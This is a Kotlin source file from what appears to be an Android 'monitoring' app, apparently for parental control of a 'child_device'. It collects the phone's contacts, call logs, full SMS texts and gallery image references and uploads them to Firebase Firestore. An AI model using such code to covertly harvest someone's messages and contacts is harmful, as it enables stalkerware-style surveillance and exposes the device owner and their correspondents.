package com.example.alphamonitoringapp.monitoring

import android.content.Context
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*

object DataUploader {

    fun uploadAllData(context: Context) {
        uploadContactsOnly(context)
        uploadCallLogs(context)
        uploadSMS(context)
        uploadGallery(context) // 👈 Replaced uploadPhotos with uploadGallery
    }

    fun uploadContactsOnly(context: Context) {
        val userId = FirebaseAuth.getInstance().currentUser?.uid ?: "child_device"
        val contactList = mutableListOf<Map<String, String>>()

        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            ) ?: return

            cursor.use {
                val nameIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)

                while (it.moveToNext()) {
                    val name = it.getString(nameIndex) ?: "Unknown"
                    val number = it.getString(numberIndex) ?: "N/A"
                    contactList.add(mapOf("name" to name, "number" to number))
                }
            }

            if (contactList.isEmpty()) return

            FirebaseFirestore.getInstance()
                .collection("contacts")
                .document(userId)
                .set(mapOf("contacts" to contactList))
                .addOnSuccessListener {
                    Log.d("DataUploader", "✅ Contacts uploaded: ${contactList.size}")
                }
                .addOnFailureListener {
                    Log.e("DataUploader", "❌ Failed to upload contacts: ${it.message}")
                }

        } catch (e: Exception) {
            Log.e("DataUploader", "❌ Exception reading contacts: ${e.message}")
        }
    }

    fun uploadCallLogs(context: Context) {
        val userId = FirebaseAuth.getInstance().currentUser?.uid ?: "child_device"
        val callList = mutableListOf<Map<String, String>>()

        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"
            ) ?: return

            val sdf = SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault())

            cursor.use {
                val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)

                while (it.moveToNext()) {
                    val number = it.getString(numberIdx)
                    val type = when (it.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Unknown"
                    }
                    val date = sdf.format(Date(it.getLong(dateIdx)))
                    val duration = it.getString(durationIdx)

                    callList.add(
                        mapOf(
                            "number" to number,
                            "type" to type,
                            "date" to date,
                            "duration" to "$duration sec"
                        )
                    )
                }
            }

            FirebaseFirestore.getInstance()
                .collection("call_logs")
                .document(userId)
                .set(mapOf("calls" to callList))
                .addOnSuccessListener {
                    Log.d("DataUploader", "✅ Call logs uploaded: ${callList.size}")
                }
                .addOnFailureListener {
                    Log.e("DataUploader", "❌ Failed to upload call logs: ${it.message}")
                }

        } catch (e: Exception) {
            Log.e("DataUploader", "❌ Exception reading call logs: ${e.message}")
        }
    }

    fun uploadSMS(context: Context) {
        val userId = FirebaseAuth.getInstance().currentUser?.uid ?: "child_device"
        val smsList = mutableListOf<Map<String, String>>()

        try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                null,
                null,
                "date DESC"
            ) ?: return

            val sdf = SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault())

            cursor.use {
                val addressIndex = it.getColumnIndex("address")
                val bodyIndex = it.getColumnIndex("body")
                val dateIndex = it.getColumnIndex("date")
                val typeIndex = it.getColumnIndex("type")

                while (it.moveToNext()) {
                    val address = it.getString(addressIndex) ?: "Unknown"
                    val body = it.getString(bodyIndex) ?: ""
                    val date = sdf.format(Date(it.getLong(dateIndex)))
                    val typeCode = it.getInt(typeIndex)

                    val type = when (typeCode) {
                        1 -> "Incoming"
                        2 -> "Outgoing"
                        else -> "Unknown"
                    }

                    smsList.add(
                        mapOf(
                            "type" to type,
                            "from" to address,
                            "message" to body,
                            "date" to date
                        )
                    )
                }
            }

            FirebaseFirestore.getInstance()
                .collection("sms_logs")
                .document(userId)
                .set(mapOf("sms" to smsList))
                .addOnSuccessListener {
                    Log.d("DataUploader", "✅ SMS uploaded: ${smsList.size}")
                }
                .addOnFailureListener {
                    Log.e("DataUploader", "❌ Failed to upload SMS: ${it.message}")
                }

        } catch (e: Exception) {
            Log.e("DataUploader", "❌ Exception reading SMS: ${e.message}")
        }
    }

    // ✅ NEW: GALLERY upload method (replaces old photo logic)
    fun uploadGallery(context: Context) {
        val userId = FirebaseAuth.getInstance().currentUser?.uid ?: "child_device"
        val imageList = mutableListOf<Map<String, String>>()

        try {
            val projection = arrayOf(
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media._ID
            )

            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val cursor = context.contentResolver.query(
                uri,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_TAKEN} DESC"
            ) ?: return

            val sdf = SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault())

            cursor.use {
                val nameIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val dateIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
                val idIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)

                var count = 0
                while (it.moveToNext() && count < 50) {
                    val name = it.getString(nameIndex)
                    val date = sdf.format(Date(it.getLong(dateIndex)))
                    val imageId = it.getLong(idIndex)
                    val imageUri = Uri.withAppendedPath(uri, imageId.toString()).toString()

                    imageList.add(
                        mapOf(
                            "name" to name,
                            "date" to date,
                            "uri" to imageUri
                        )
                    )
                    count++
                }
            }

            FirebaseFirestore.getInstance()
                .collection("gallery")
                .document(userId)
                .set(mapOf("images" to imageList))
                .addOnSuccessListener {
                    Log.d("DataUploader", "✅ Gallery uploaded: ${imageList.size}")
                }
                .addOnFailureListener {
                    Log.e("DataUploader", "❌ Failed to upload gallery: ${it.message}")
                }

        } catch (e: Exception) {
            Log.e("DataUploader", "❌ Exception reading gallery: ${e.message}")
        }
    }
}
